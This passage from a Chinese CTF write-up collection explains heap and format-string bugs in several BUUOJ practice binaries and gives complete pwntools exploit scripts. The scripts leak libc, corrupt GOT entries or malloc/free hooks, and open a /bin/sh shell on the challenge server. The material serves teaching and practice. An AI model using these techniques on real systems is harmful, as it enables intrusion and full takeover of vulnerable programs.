    elf = ELF('./note2')
    libc = ELF('./libc-2.23.so')
    io.sendlineafter('Input your name:\n', 'so4ms')
    io.sendlineafter('Input your address:\n', 'SCU')
    def add(size, content):
        io.sendlineafter('option--->>\n', str(1))
        io.sendlineafter('(less than 128)\n', str(size))
        io.sendlineafter('content:\n', content)
    def display(index):
        io.sendlineafter('option--->>\n', str(2))
        io.sendlineafter('Input the id of the note:\n', str(index))
    def edit(index, choice, conetnt):
        io.sendlineafter('option--->>\n', str(3))
        io.sendlineafter('Input the id of the note:\n', str(index))
        io.sendlineafter('[1.overwrite/2.append]\n', str(choice))
        io.sendlineafter('TheNewContents:', conetnt)
    def delete(index):
        io.sendlineafter('option--->>\n', str(4))
        io.sendlineafter('Input the id of the note:\n', str(index))
    heaparray = 0x602120
    fd = heaparray - 0x18
    bk = heaparray - 0x10
    atoi_got = elf.got['atoi']
    payload = p64(0) + p64(0x81) + p64(fd) + p64(bk)
    add(0x60, payload) # 0
    add(0, 'aaaa')  # 1
    add(0x80, 'content') # 2
    delete(1)
    add(0, '\x00' * 0x10 + p64(0x80) + p64(0x90))
    delete(2)
    edit(0, 1, 'a' * 0x18 + p64(atoi_got))
    display(0)
    address = u64(io.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
    print(hex(address))
    libc_base = address - libc.symbols['atoi']
    system = libc_base + libc.symbols['system']
    edit(0, 1, p64(system))
    io.sendlineafter('option--->>\n', '/bin/sh\x00')\
    io.interactive()
## 0x15 gyctf_2020_some_thing_interesting
进入main函数后，回显执行begin函数，读取输入，然后与 `"OreOOrereOOreO"` 前14个字符进行比较，需相等才能进入后面的代码。
    char *begin()
    {
      memset(s1, 0, 0x14uLL);
      puts("#######################");
      puts("#       Surprise      #");
      puts("#---------------------#");
      printf("> Input your code please:");
      read(0, s1, 0x13uLL);
      if ( strncmp(s1, "OreOOrereOOreO", 0xEuLL) )
      {
        puts("Emmmmmm!Maybe you want Fool me!");
        exit(0);
      }
      puts("#---------------------#");
      puts("#      ALL Down!      #");
      puts("#######################");
      return s1;
    }
随后进入菜单选择，选择0的话就会输出我们刚才输入的内容，存在格式化字符串漏洞，程序开启了PIE保护，我们可以利用格式化字符串漏洞来泄露libc的基址。
    unsigned __int64 __fastcall sub_D3D(const char *a1)
    {
      unsigned __int64 v2; // [rsp+18h] [rbp-8h]
      v2 = __readfsqword(0x28u);
      if ( dword_202010 )
      {
        puts("Now you are ....?");
        printf("# Your Code is ");
        printf(a1);
        putchar(10);
        puts("###############################################################################");
      }
      else
      {
        puts("Now you are Administrator!");
      }
      return __readfsqword(0x28u) ^ v2;
    }
选择1进入add函数，会进行两次空间分配，然后分别利用两个数组存储地址，还有两个数组存储申请的大小。
    unsigned __int64 add()
    {
      int index; // [rsp+4h] [rbp-Ch]
      unsigned __int64 v2; // [rsp+8h] [rbp-8h]
      v2 = __readfsqword(0x28u);
      puts("#######################");
      puts("#     Create Oreo     #");
      puts("#---------------------#");
      for ( index = 1; index  O's length : ");
      _isoc99_scanf("%ld", &array_size[index]);
      if ( array_size[index]  0x70 )
      {
        puts("Emmmmmm!Maybe you want Fool me!");
        leave();
      }
      chunk_array[index] = (char *)malloc(array_size[index]);
      printf("> O : ");
      read(0, chunk_array[index], array_size[index]);
      printf("> RE's length : ");
      _isoc99_scanf("%ld", &re_size[index]);
      if ( re_size[index]  112 )
      {
        puts("Emmmmmm!Maybe you want Fool me!");
        leave();
      }
      printf("> RE : ");
      array_re[index] = (char *)malloc(re_size[index]);
      read(0, array_re[index], re_size[index]);
      puts("#---------------------#");
      puts("#      ALL Down!      #");
      puts("#######################");
      return __readfsqword(0x28u) ^ v2;
    }
edit函数进行编辑，display函数进行输出，很常规。
delete函数在free后没有进行置零，存在UAF漏洞。
    unsigned __int64 sub_130A()
    {
      int v1; // [rsp+4h] [rbp-Ch] BYREF
      unsigned __int64 v2; // [rsp+8h] [rbp-8h]
      v2 = __readfsqword(0x28u);
      puts("#######################");
      puts("#     Delete Oreo     #");
      puts("#---------------------#");
      printf("> Oreo ID : ");
      _isoc99_scanf("%d", &v1);
      if ( v1  10 || !chunk_array[v1] )
      {
        puts("Emmmmmm!Maybe you want Fool me!");
        leave();
      }
      free(chunk_array[v1]);
      free(array_re[v1]);
      puts("#---------------------#");
      puts("#      ALL Down!      #");
      puts("#######################");
      return __readfsqword(0x28u) ^ v2;
    }
那么思路就很清晰了，利用格式化字符串漏洞泄露libc的基址，然后free掉我们申请的0x60大小的空间，然后对其进行编辑，将 `__malloc_hook
- 0x23` 的地址进行输入，进行`fastbin attack` ,申请到这块空间后，在`__malloc_hook`
的位置输入one_gadget的地址即可。
exp:
    from pwn import *
    context.log_level = 'debug'
    # io = process('./gyctf_2020_some_thing_interesting')
    io = remote('node3.buuoj.cn', 29387)
    elf = ELF('./gyctf_2020_some_thing_interesting')
    libc = ELF('./libc-2.23.so')
    malloc_hook = libc.symbols['__malloc_hook'] - 0x23
    def add(len_O, content_O, len_RE, content_RE):
        io.sendlineafter('want to do :', str(1))
        io.sendlineafter('> O\'s length : ', str(len_O))
        io.sendlineafter('> O : ', content_O)
        io.sendlineafter('> RE\'s length : ', str(len_RE))
        io.sendlineafter('> RE : ', content_RE)
    def edit(index, content_O, content_RE):
        io.sendlineafter('want to do :', str(2))
        io.sendlineafter('> Oreo ID : ', str(index))
        io.sendlineafter('> O : ', content_O)
        io.sendlineafter('> RE : ', content_RE)
    def delete(index):
        io.sendlineafter('want to do :', str(3))
        io.sendlineafter('> Oreo ID : ', str(index))
    def display(index):
        io.sendlineafter('want to do :', str(4))
        io.sendlineafter('> Oreo ID : ', str(index))
    io.sendlineafter('> Input your code please:', 'OreOOrereOOreO%17$p')
    io.sendlineafter('want to do :', str(0))
    io.recvuntil('0x')
    address = int(io.recv(12), 16) - 240
    libc_base = address - libc.symbols['__libc_start_main']
    print('libc_base -> ', hex(libc_base))
    one_gadget = libc_base + 0xf1147
    add(0x60, 'content_O', 0x60, 'content_RE') # 1
    delete(1)
    edit(1, p64(malloc_hook + libc_base), p64(malloc_hook + libc_base))
    payload = 'a' * 0x13 + p64(one_gadget)
    add(0x60, payload, 0x60, payload) # 2
    io.sendlineafter('want to do :', str(1))
    io.sendlineafter('> O\'s length : ', str(16))
    io.interactive()
## 0x16 ciscn_2019_en_3
程序会先读取两次输入，分别输出，这里 `_printf_chk(1LL, buf);`
存在格式化字符串漏洞，原本是printf函数，但是开启了FORTIFY保护，会对我们的输入进行检查，避免了格式化字符串跳过某些参数（如直接%7$x）等方式来避免漏洞出现。
这里我是输入多个%p来泄露栈上的地址，没有注意到后面的puts函数也可以通过输入8个字节内容从而把后面的内容也给泄露出来。
    unsigned __int64 run()
    {
      int v1; // [rsp+Ch] [rbp-44h] BYREF
      char s[16]; // [rsp+10h] [rbp-40h] BYREF
      char buf[40]; // [rsp+20h] [rbp-30h] BYREF
      unsigned __int64 v4; // [rsp+48h] [rbp-8h]
      v4 = __readfsqword(0x28u);
      puts("Welcome to the story kingdom.");
      puts("What's your name?");
      read(0, buf, 0x20uLL);
      _printf_chk(1LL, buf);
      puts("Please input your ID.");
      read(0, s, 8uLL);
      puts(s);
      while ( 1 )
      {
        menu();
        _isoc99_scanf("%d", &v1);
        getchar();
        switch ( v1 )
        {
          case 1:
            add();
            break;
          case 2:
            fake_edit();
            break;
          case 3:
            fake_display();
            break;
          case 4:
            delete();                               // UAF
            break;
          case 5:
            puts("Goodbye~");
            exit(0);
          default:
            puts("Wrong choice!");
            return __readfsqword(0x28u) ^ v4;
        }
      }
    }
后面还是菜单题，只有增加、删除两个功能，有chunk_array何array_size两个数组分别记录chunk的地址和大小。
    unsigned __int64 add()
    {
      int v0; // ebx
      int size; // [rsp+4h] [rbp-1Ch] BYREF
      unsigned __int64 v3; // [rsp+8h] [rbp-18h]
      v3 = __readfsqword(0x28u);
      if ( chunk_num > 16 )
        puts("Enough!");
      puts("Please input the size of story: ");
      _isoc99_scanf("%d", &size);
      LODWORD(array_size[2 * chunk_num]) = size;
      v0 = chunk_num;
      chunk_array[2 * v0] = (char *)malloc(size);
      puts("please inpute the story: ");
      read(0, chunk_array[2 * chunk_num], size);
      ++chunk_num;
      puts("Done!");
      return __readfsqword(0x28u) ^ v3;
    }
然后是delete函数，存在UAF漏洞，由于是libc-2.27，直接利用tcache来double free就可以了。
    unsigned __int64 sub_D32()
    {
      int v1; // [rsp+4h] [rbp-Ch] BYREF
      unsigned __int64 v2; // [rsp+8h] [rbp-8h]
      v2 = __readfsqword(0x28u);
      puts("Please input the index:");
      _isoc99_scanf("%d", &v1);
      free(*((void **)&chunk_array + 2 * v1));
      puts("Done!");
      return __readfsqword(0x28u) ^ v2;
    }
exp:
    from pwn import *
    context.log_level = 'debug'
    # io = process('./ciscn_2019_en_3')
    io = remote('node3.buuoj.cn', 27640)
    elf = ELF('./ciscn_2019_en_3')
    libc = ELF('./libc-2.27.so')
    def add(size, content):
        io.sendlineafter('Input your choice:', str(1))
        io.sendlineafter('size of story: \n', str(size))
        io.sendlineafter('inpute the story: \n', content)
    def delete(index):
        io.sendlineafter('Input your choice:', str(4))
        io.sendlineafter('input the index:\n', str(index))
    io.sendlineafter('What\'s your name?\n', '%p.%p.%p.%p.%p')
    io.recvuntil('500.0x')
    address = int(io.recv(12), 16)
    libc_base = address - libc.symbols['_IO_file_jumps']
    print(hex(libc_base))
    free_hook = libc.symbols['__free_hook'] + libc_base
    system = libc_base + libc.symbols['system']
    print(hex(system))
    io.sendlineafter('Please input your ID.\n', 'aaaa')
    add(0x60, 'aaaa') # 0
    delete(0)
    delete(0)
    add(0x60, p64(free_hook))
    add(0x60, '/bin/sh')
    add(0x60, p64(system))
    io.sendlineafter('Input your choice:', str(4))
    io.sendlineafter('input the index:\n', str(1))
    io.interactive()
## 0x17 picoctf_2018_are you root
程序有五个功能，查看登录状态、登录、设置权限等级、读取flag和退出登录。
    int menu()
    {
      puts("Available commands:");